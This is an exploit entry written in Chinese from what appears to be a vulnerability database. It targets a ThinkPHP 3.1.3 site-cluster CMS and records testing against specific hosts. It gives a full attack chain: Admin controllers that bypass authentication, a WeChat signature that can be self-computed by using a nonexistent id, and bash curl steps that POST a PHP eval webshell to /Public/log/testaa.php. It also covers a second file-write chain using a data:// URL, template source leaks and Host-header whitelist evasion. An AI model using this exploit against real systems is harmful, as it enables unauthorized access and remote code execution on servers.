# ThinkPHP 3.1.3 站群 CMS：extends Action 的 Admin 控制器绕鉴权 + 微信签名可自算 → 未授权文件写入（Wechat::index_1）

- **code**: thinkphp-3.1.3-站群-cms-extends-action-的-admin-控制器绕鉴权-微信签名可自算-未授权文件写入-wechat-index
- **kind**: exp
- **category**: auth-bypass
- **component**: 六合彩/聚宝阁站群 CMS（ThinkPHP 3.1.3，署名 SomCNS「新开发example」）
- **severity**: high
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-13 在 203.0.113.100:443（Host: example.com）实测：① GET /example.com?g=Admin&m=Wechat&a=index_1 → 200/9B "no access"（说明该控制器未走鉴权，被 valid() 拦下）；② 自算签名后 GET 加 echostr=HELLOORACLE&signature=5e9fe13e397bf1221f52b81bff0418dd26a4a0a8&timestamp=1791880896&nonce=12345&id=999999 → **回显 HELLOORACLE**，对照 signature=deadbeef → no access；③ POST 同 URL（body=`<?php echo "RW166OK"; ?>`）→ 200/0B，回读 /Public/log/testaa.php → 404 nginx、GET /Public/log/ → 404（而 /Public/ 与 /Public/www/ 均 403）→ **鉴权绕过与签名自算已验证成立，文件写入因 ./Public/log/ 目录不存在而落空**；同法 GET /example.com?g=Admin&m=Autoart&a=kjer → 200/88879B 零凭证（对照 a=User/index → 302），确认 extends Action 绕过模式在该站群复现。落库 vuln_id=22/23、HTTP 证据 id=12/13/17、chain seq=44/46。

【2026-10-13 二次独立复现 @ 203.0.113.101（同站群另一台主机，资产 31 —— 另一路 vuln-scan 独立跑出同一结论，本条目由此升级为"跨主机已验证"）】
① **补齐 Admin 组域名白名单机制**：`App/Lib/Action/Admin/CommonAction.class.php::_initialize()` 以 `$_SERVER['HTTP_HOST']` 比对白名单，非白名单域名一律 `redirect('/')`。176 的白名单 = `thisexample55.admin.thbwebs.thiswillbegreat.abrdns.com` 与 `thisexample66.admin.thbwebs.thiswillbegreat.abrdns.com`，**两者 DNS 均直接解析到 176 本身**（对照 admin.jbg.example.top → 203.0.113.22）⇒ 用它们做 Host 即过域名门槛；且用主域名 URL + 白名单 Host 头同样有效（nginx 透传 Host 给 PHP）。
② **echostr oracle 补齐三种 ordinal 排序场景**（原条目仅给 nonce=12345 一例，实操易踩坑）：`nonce=12345`、`nonce=99999`、`nonce=vs176n0nce` 三者均返回 `200/21B` 原样回显 oracle；错误签名 → `200/9B no access`。**必须真做 `sort(SORT_STRING)` ordinal 排序，不可硬编码拼接顺序。**
③ **"no access" 精确来源**：`App/Common/Wechat/Wechat.class.php:239` —— `valid()` 的 POST 分支走完后**仍无条件**执行 `if(!$this->checkSignature($encryptStr)){ ... die('no access'); }`。故"POST 不需要签名"是错的，签名是必经门槛（这点原条目的步骤描述容易误读）。
④ **写入落空判定法固化为三条对照**：`GET /Public/log/`=404 ∧ `GET /Public/log/testaa.php`=404 ∧（阳性对照）`GET /Public/`=403 且 `GET /Public/www/`=403。再用唯一 marker（`VS176_MARKER_<md5>`）POST 后对 23 个候选落点逐一回读、全部未命中 ⇒ 确证是"落空"而非"落在别处"（避免误判成功）。
⑤ **176 上的同类旁路补充**：`/App/Tpl/**.html` 被 nginx 静态直出 —— `/App/Tpl/Admin/Public_left.html` 200/4116B（后台全菜单）、`/App/Tpl/Home/Index_example.com` 200/341056B（get_html1 的写入目标原文）、`/App/Tpl/Home/Article_edit_cont.html` 200/19899B。据此零凭证测绘出 176 全部控制器/动作与 5 个后台写操作表单字段。**注意：176 上不存在 Autoart 模块（GET g=Admin&m=Autoart&a=index → nginx 404），Wechat 是 176 上唯一零凭证控制器** —— 即"Autoart 也 extends Action"这条推论只在 166 成立，换主机需重新枚举验证。
⑥ 落库：vuln_id=34（high）、http_evidence id=24、chain id=66。
- **path**: pocs/thinkphp-3.1.3-站群-cms-extends-action-的-admin-控制器绕鉴权-微信签名可自算-未授权文件写入-wechat-index/thinkphp313_cms_action_authbypass.md
- **tags**: thinkphp,thinkphp3.1.3,鉴权绕过,extends Action,微信签名,任意文件写入,站点群,kindeditor,模板源码泄露
- **created_at**: 2026-10-13T08:55:07.204Z

## 描述

该 ThinkPHP 3.1.3 站群 CMS 的后台鉴权写在 CommonAction 里，凡 `extends Action` 的 Admin 控制器（Wechat、Autoart）整段跳过鉴权。Wechat::index_1 有「原始 POST body 直落 ./Public/log/testaa.php」的写文件原语，唯一门槛是微信签名 —— 而 id 传不存在值可让 token 变空，签名完全可自算。附 echostr 只读 oracle 与「写失败无回显」的判别方法。

## 用法

```
1) 判版本与路径：curl -k "https://TARGET/User" → 异常页「模板不存在[/www/wwwroot/<项目>/App/Tpl/Home/User_example.com]」+ ThinkPHP 3.1.3\n2) 枚举后台控制器：curl -k "https://TARGET/App/Tpl/Admin/Public_left.html"（模板可直读，直接给全部后台入口）\n3) 鉴权矩阵：对 g=Admin&m=<控制器>&a=<方法> 逐个测 —— 200=绕鉴权 / 302 到 Index/login=需登录；阴性对照用 a=User/index\n4) 对 extends Action 的控制器找写文件原语（备份源码 grep file_put_contents）\n5) 自算微信签名并用 echostr 做只读 oracle 确认，再 POST 写 shell\n6) 落点回读：/Public/log/testaa.php 必须先确认 GET /Public/log/ 是 403（存在）还是 404（不存在）
```

## 正文

```
## 原理
该 CMS 的后台鉴权放在 `App/Lib/Action/Admin/CommonAction.class.php::_initialize()`，只有**继承 CommonAction 的控制器**才过鉴权。
源码里存在两类「脱队」控制器：

```php
class WechatAction extends Action { }   // ← Admin 组，但不继承 CommonAction → 鉴权整体跳过
class AutoartAction extends Action { }  // ← 同上（新版新增的 Autoart 模块也是这个写法）
```

且 `CommonAction::_initialize()` 自身还有一条 `MODULE_NAME != "Index"` 的豁免，所以 `Admin/Index/*`（login/logout/index）本来就免登录。

### Wechat::index_1() 的写入原语
```php
public function index_1(){
    $weObj = $this->init();          // M("wechat")->where(array("id"=>$_GET['id']))->find()
    $weObj->valid();                 // ← 唯一的门槛：微信签名校验
    $trader = M('wechat')->where(array('id'=>$_GET['id']))->find();
    $postStr = file_get_contents("php://input");   // 原始 POST body
    $postObj = simplexml_load_string($postStr,'SimpleXMLElement',LIBXML_NOCDATA);
    file_put_contents("./Public/log/testaa.php",$postStr);   // ← 原始 body 直落 .php，无任何过滤
    ...
}
```

### 微信签名可自算（关键）
`Wechat.class.php::checkSignature()`：
```php
$token = $this->token;                                   // 来自 $config['token']
$tmpArr = array($token, $timestamp, $nonce, $str);
sort($tmpArr, SORT_STRING);                              // 二进制(ordinal)排序
$tmpStr = sha1( implode($tmpArr) );
if( $tmpStr == $_GET['signature'] ) return true;
```
- **`id` 传一个不存在的值** → `M("wechat")->find()` 返回 null → `$token = ''`（空）→ 我们完全掌握。
- GET 请求 / 非 `encrypt_type=aes` 时 `$str = ''`。
- 所以签名 = `sha1( sort_ordinal(['', timestamp, nonce, '']) 拼接 )`。
- ⚠️ `sort(...,SORT_STRING)` 是**字符串序**：`nonce` 与 `timestamp` 谁排前取决于首字符。ts 以 '1' 开头，所以 `nonce=12345` 时 → `nonce+timestamp`；`nonce=99999` 时 → `timestamp+nonce`。**必须真做 ordinal 排序，别硬编码顺序**（我第一次用 nonce=77777 硬按 nonce+ts 拼就失败在 `no access`）。

## 利用步骤
```bash
# 0) 选一个 12 位左右的随机 ename/id 值，id 用不存在的（例如 999999）
TS=$(date +%s); NONCE=12345
# 1) 按 ordinal 排序拼接后 sha1（token='' , str=''）
CONCAT=$(printf "%s" "$NONCE$TS")      # nonce=12345 < ts 时成立
SIG=$(printf "%s" "$CONCAT" | sha1sum | cut -d' ' -f1)

# 2) 只读 oracle —— 先确认签名对不对（回显 HELLOORACLE 即通过）
curl -k --noproxy '*' -s \
  "https://TARGET/example.com?g=Admin&m=Wechat&a=index_1&echostr=HELLOORACLE&signature=$SIG&timestamp=$TS&nonce=$NONCE&id=999999"

# 3) 写入 payload 到 ./Public/log/testaa.php（相对于站点根）
curl -k --noproxy '*' -s -H "Host: <白名单Host>" \
  --data-binary '<?php @eval($_POST["x"]); ?>' \
  "https://TARGET/example.com?g=Admin&m=Wechat&a=index_1&signature=$SIG&timestamp=$TS&nonce=$NONCE&id=999999"

# 4) 访问 http(s)://TARGET/Public/log/testaa.php
```

## 前置条件 / 卡点
- **`./Public/log/` 目录必须存在**。`file_put_contents` 不会自动建目录；目录缺失时只产生 E_WARNING，而 ThinkPHP 的 `appError()` 对 E_WARNING 只 `Log::record()` 不 `halt()`，所以**响应体是 200/0B，HTTP 层完全看不出失败**。
  判定目录是否存在：`GET /Public/log/` → 403 表示存在（autoindex off）、404 表示不存在；同时用 `/Public/`、`/Public/www/` 的 403 作阳性对照。
- 同类函数 `Wechat::index()` 写 `./Public/log/a1.php`、`a2.php`、`a4.php`、`test1qq.php`，同一门槛、同一目录问题。
- 该 CMS 的**另一条无鉴权写文件链**（需后台会话）：`Admin/Api::article_save` 收 POST `{url,ename,you,me}` → `file_put_contents("./Public/www/main_r3_".$_POST['ename'].".php", file_get_contents($_POST['url']))`，用 `data://text/plain;base64,<b64>` 作 url 即可原样写入 PHP，落点 `/Public/www/main_r3_<ename>.php` 可直接访问；`/Public/www/` 在部署上确实存在（403）。

## 旁路情报（同一响应/页面顺手能拿到的）
- `/App/Tpl/**.html` 模板以静态文件被 nginx 直出 → **后台整站模板源码可读**；`Admin/Public_left.html` 就是完整后台菜单，能一次性拿到全部后台控制器入口（本靶标即由它挖出备份源码里没有的新模块 `Autoart`）。
- `Admin/Autoart/*`（开奖管理）大概率同样是 `extends Action` → 零凭证 200，含 `article_save` / `editkjer` / `del` 写操作入口。
- KindEditor `/Public/main/js/kindeditor/php/upload_json.php` 与 `file_manager_json.php` 无鉴权（上传限 gif,jpg,jpeg,png,bmp；file_manager 的 `..` 有过滤）。
```
